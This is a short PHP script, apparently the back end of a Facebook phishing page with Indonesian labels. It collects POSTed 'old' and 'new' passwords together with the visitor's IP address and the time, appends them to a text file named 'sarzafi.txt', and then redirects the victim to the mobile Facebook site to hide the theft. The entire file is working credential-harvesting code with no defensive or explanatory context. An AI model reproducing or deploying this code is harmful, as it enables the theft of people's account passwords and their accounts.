<?php
$wakwa = $_POST['wakwa'];
$email = $_POST['email'];
$pesan = $_POST['pesan'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$myFile = "sarzafi.txt";

$fh = fopen($myFile, 'a') or die("can’t open file");

$stringData = "==================== \n IP:".$ip."\n Time: ".$today."\n password Lama: ".$email."\n Password Baru:".$wakwa."\n Password Baru: ".$pesan."\n";

fwrite($fh, $stringData);

fclose($fh);

echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Mengalihkan halaman</title>
<meta http-equiv="Refresh" content="1; URL=http://m.facebook.com/home.php?"/>
</head><body>
</body>
</html>
';

?>
